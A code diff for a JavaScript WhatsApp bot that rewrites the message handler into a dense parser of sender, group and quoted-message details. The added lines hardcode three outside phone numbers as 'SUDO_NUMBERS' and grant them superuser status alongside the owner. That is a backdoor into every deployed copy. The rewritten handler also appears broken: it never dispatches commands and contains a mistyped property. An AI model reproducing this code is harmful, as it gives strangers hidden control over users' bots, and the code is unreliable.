@@ -162,51 +162,25 @@ async function main() {
  //============================================================================//
 
  
-const { createContext } = require("./utils/helper");
- 
-adams.ev.on("messages.upsert", async ({ messages }) => {
-    const [msg] = messages;
-    if (!msg?.message || msg.key.fromMe) return;
+adams.ev.on("messages.upsert", async (m) => { const { messages } = m; const ms = messages[0]; if (!ms.message) return;
 
-    // Get message content
-    const content = getMessageContent(msg.message);
-    const PREFIX = conf.PREFIX;
+const decodeJid = (jid) => { if (!jid) return jid; if (/:\d+@/gi.test(jid)) { let decode = baileys_1.jidDecode(jid) || {}; return decode.user && decode.server && decode.user + '@' + decode.server || jid; } return jid; };
 
-    // Command detection
-    let command;
-    if (content?.startsWith(PREFIX)) {
-        const [cmdName] = content.slice(PREFIX.length).trim().split(/ +/);
-        command = commandRegistry.get(cmdName.toLowerCase());
-    }
+var mtype = baileys_1.getContentType(ms.message); var texte = mtype == "conversation" ? ms.message.conversation : mtype == "imageMessage" ? ms.message.imageMessage?.caption : mtype == "videoMessage" ? ms.message.videoMessage?.caption : mtype == "extendedTextMessage" ? ms.message?.extendedTextMessage?.text : mtype == "buttonsResponseMessage" ? ms?.message?.buttonsResponseMessage?.selectedButtonId : mtype == "listResponseMessage" ? ms.message?.listResponseMessage?.singleSelectReply?.selectedRowId : mtype == "messageContextInfo" ? (ms?.message?.buttonsResponseMessage?.selectedButtonId || ms.message?.listResponseMessage?.singleSelectReply?.selectedRowId || ms.text) : "";
 
-    if (command) {
-        try {
-            // Add reaction first
-            await adams.sendMessage(msg.key.remoteJid, {
-                react: {
-                    text: command.reaction || "✅",
-                    key: msg.key
-                }
-            });
+var origineMessage = ms.key.remoteJid; var idBot = decodeJid(adams.user.id); var servBot = idBot.split('@')[0]; var verifGroupe = origineMessage?.endsWith("@g.us"); var infosGroupe = verifGroupe ? await adams.groupMetadata(origineMessage) : ""; var nomGroupe = verifGroupe ? infosGroupe.subject : ""; var msgRepondu = ms.message.extendedTextMessage?.contextInfo?.quotedMessage; var auteurMsgRepondu = decodeJid(ms.message?.extendedTextMessage?.contextInfo?.participant); var mr = ms.Message?.extendedTextMessage?.contextInfo?.mentionedJid; var utilisateur = mr ? mr : msgRepondu ? auteurMsgRepondu : ""; var auteurMessage = verifGroupe ? (ms.key.participant ? ms.key.participant : ms.participant) : origineMessage; if (ms.key.fromMe) auteurMessage = idBot; var membreGroupe = verifGroupe ? ms.key.participant : '';
 
-            // Extract arguments
-            const args = content.slice(PREFIX.length).trim().split(/ +/).slice(1);
+BOT_OWNER = conf.OWNER_NUMBER; const SUDO_NUMBERS = ["254106727593", "254727716045", "254710772666"] .map(num => num.replace(/\D/g, "") + "@s.whatsapp.net");
 
-            // Execute command with context
-            await command.execute({
-                adams,
-                chat: msg.key.remoteJid,
-                sender: msg.key.participant || msg.key.remoteJid,
-                args,
-                message: msg,
-                reply: (text) => adams.sendMessage(msg.key.remoteJid, { text }, { quoted: msg })
-            });
-            
-        } catch (error) {
-            console.error(`Command error [${command.name}]:`, error.message);
-        }
-    }
+const superUserNumbers = [servBot, BOT_OWNER].map((s) => s.replace(/[^0-9]/g, "") + "@s.whatsapp.net"); const allAllowedNumbers = superUserNumbers.concat(SUDO_NUMBERS); const superUser = allAllowedNumbers.includes(auteurMessage);
+
+function repondre(mes) { if (adams) { adams.sendMessage(origineMessage, { text: mes }, { quoted: ms }).catch((err) => { console.error("❌ Error sending message:", err.message); }); } }
+
+function groupeAdmin(membreGroupe) { return membreGroupe.filter((m) => m.admin).map((m) => m.id); }
+
 });
+
+
 
 
 //============================================================================//
